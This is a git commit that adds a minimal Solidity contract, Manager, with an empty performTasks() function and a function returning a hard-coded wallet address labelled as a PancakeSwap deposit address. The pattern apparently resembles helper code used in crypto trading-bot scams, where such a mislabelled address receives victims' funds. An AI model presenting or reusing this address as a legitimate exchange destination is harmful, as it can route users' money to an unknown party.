25156eed94a7ccb8bbce3acadc7626242804ba8c
rootasgard <39178767+rootfast@users.noreply.github.com>
2023-03-16 00:01:57 -0300

    Create bnb.sol

---
+++ bnb.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+
+    }
+
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xa38C641a9613053b45d20eBcb325ACC33956fbDC;
+    }
+}
+
+//pancakeswapfunction
